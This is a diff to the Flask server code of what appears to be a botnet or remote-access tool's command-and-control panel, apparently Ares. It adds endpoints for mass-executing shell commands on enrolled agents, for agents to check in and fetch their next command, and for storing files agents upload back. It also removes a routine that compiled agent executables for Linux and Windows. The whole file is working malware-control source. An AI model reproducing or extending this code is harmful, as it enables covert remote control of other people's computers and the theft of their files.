@@ -11,8 +11,13 @@ from flask import abort
 from flask import current_app
 from flask import url_for
 from flask import send_file
+from flask import render_template
 from werkzeug.utils import secure_filename
 import pygeoip
+from flask import flash
+from flask import redirect
+from flask import escape
+import cgi
 
 from webui import require_admin
 from models import db
@@ -32,6 +37,22 @@ def geolocation(ip):
     return geoloc_str
 
 
+@api.route('/massexec', methods=['POST'])
+@require_admin
+def mass_execute():
+    selection = request.form.getlist('selection')
+    if 'execute' in request.form:
+        for agent_id in selection:
+            Agent.query.get(agent_id).push_command(request.form['cmd'])
+        flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
+    elif 'delete' in request.form:
+        for agent_id in selection:
+            db.session.delete(Agent.query.get(agent_id))
+        db.session.commit()
+        flash('Deleted %s agents' % len(selection))
+    return redirect(url_for('webui.agent_list'))
+
+
 @api.route('/<agent_id>/push', methods=['POST'])
 @require_admin
 def push_command(agent_id):
@@ -42,44 +63,37 @@ def push_command(agent_id):
     return ''
 
 
+@api.route('/<agent_id>/stdout')
+@require_admin
+def agent_console(agent_id):
+    agent = Agent.query.get(agent_id)
+    return render_template('agent_console.html', agent=agent)
+
+
 @api.route('/<agent_id>/hello', methods=['POST'])
 def get_command(agent_id):
-    # No agent_id, register the new agent
-    agent = None
-    if agent_id == 'anonymous':
-        agent = Agent()
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        agent = Agent(agent_id)
         db.session.add(agent)
         db.session.commit()
-    else:
-        agent = Agent.query.get(agent_id)
-        if not agent:
-            print "Creating agent"
-            agent = Agent()
-            agent.set_id(agent_id)
-            agent.rename(agent_id)
-            db.session.add(agent)
-            db.session.commit()
     # Report basic info about the agent
     info = request.json
     if info:
         if 'platform' in info:
             agent.operating_system = info['platform']
-        if 'cwd' in info:
-            agent.set_cwd(info['cwd'])
     agent.last_online = datetime.now()
     agent.remote_ip = request.remote_addr
     agent.geolocation = geolocation(agent.remote_ip)
     db.session.commit()
     # Return pending commands for the agent
-    cmds = {}
-    for cmd in agent.commands.filter_by(executed=False).order_by(Command.timestamp.desc()):
-        cmds[cmd.id] = cmd.cmdline
-    # Build JSON response
-    resp = {}
-    resp['cmds'] = cmds
-    if agent_id == 'anonymous':
-        resp['set_UID'] = agent.id
-    return json.dumps(resp)
+    cmd_to_run = ''
+    cmd = agent.commands.order_by(Command.timestamp.desc()).first()
+    if cmd:
+        cmd_to_run = cmd.cmdline
+        db.session.delete(cmd)
+        db.session.commit()
+    return cmd_to_run
 
 
 @api.route('/<agent_id>/report', methods=['POST'])
@@ -87,59 +101,32 @@ def report_command(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
         abort(404)
-    cmd_id = int(request.form['id'])
-    output = request.form['output']
-    cwd = request.form['cwd']
-    cmd = Command.query.filter_by(id=cmd_id).first()
-    if cmd and not cmd.executed:                
-        cmd.output = base64.b64decode(output)
-        cmd.executed = True
-        agent.set_cwd(cwd)
-        if cmd.waits_file:
-            for output_file in request.files.values():
-                relative_path = agent_id
-                absolute_path = os.path.join(current_app.config['UPLOAD_FOLDER'], relative_path)
-                filename = secure_filename(output_file.filename)
-                if not os.path.exists(absolute_path):
-                    os.makedirs(absolute_path)
-                while os.path.exists(os.path.join(absolute_path, filename)):
-                    filename = '_' + filename
-                output_file.save(os.path.join(absolute_path, filename))
-                download_link = url_for('webui.uploads', path=os.path.join(relative_path, filename))
-                cmd.server_output += 'File uploaded: <a href="' + download_link + '">' + download_link + '</a>'
-        db.session.add(cmd)
-        db.session.commit()
-    else:
-        abort(404)
+    out = request.form['output']
+    agent.output += cgi.escape(out)
+    db.session.add(agent)
+    db.session.commit()
     return ''
 
 
-def _build_agent(agent_id, platform, server_url, hello_interval, idle_time):
-    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
-    if os.path.exists(working_dir):
-        shutil.rmtree(working_dir)
-    shutil.copytree('../agent', working_dir)
-    template_conf = open('../agent/template_config.py', 'r').read()
-    template_conf = template_conf.replace('__UID__', agent_id)
-    template_conf = template_conf.replace('__SERVER__', server_url)
-    template_conf = template_conf.replace('__HELLO_INTERVAL__', str(hello_interval))
-    template_conf = template_conf.replace('__IDLE_TIME__', str(idle_time))
-    with open(os.path.join(working_dir, 'config.py'), 'w') as f:
-        f.write(template_conf)
-    if platform == 'Linux':
-        cwd = os.getcwd()
-        os.chdir(working_dir)
-        shutil.move('agent.py', agent_id + '.py')
-        os.system('pyinstaller --workpath ' + os.path.join(working_dir, 'build') + ' --distpath ' + os.path.join(working_dir, 'dist') + ' --onefile ' + agent_id + '.py')
-        agent_file = os.path.join(working_dir, 'dist', agent_id)
-        os.chdir(cwd)
-        return agent_file
-    elif platform == 'Windows':
-        cwd = os.getcwd()
-        os.chdir(working_dir)
-        shutil.move('agent.py', agent_id + '.py')
-        os.system('wine pyinstaller --noconsole --onefile ' + agent_id + '.py')
-        agent_file = os.path.join(working_dir, 'dist', agent_id + '.exe')
-        os.chdir(cwd)
-        return agent_file
+@api.route('/<agent_id>/upload', methods=['POST'])
+def upload(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    for file in request.files.values():
+        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
+        agent_dir = agent_id
+        store_dir = os.path.join(upload_dir, agent_dir)
+        filename = secure_filename(file.filename)
+        if not os.path.exists(store_dir):
+            os.makedirs(store_dir)
+        file_path = os.path.join(store_dir, filename)
+        while os.path.exists(file_path):
+            filename = "_" + filename
+            file_path = os.path.join(store_dir, filename)
+        file.save(file_path)
+        download_link = url_for('webui.uploads', path=os.path.join(agent_dir, filename))
+        agent.output += 'File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
+        db.session.add(agent)
+        db.session.commit()
     return ''
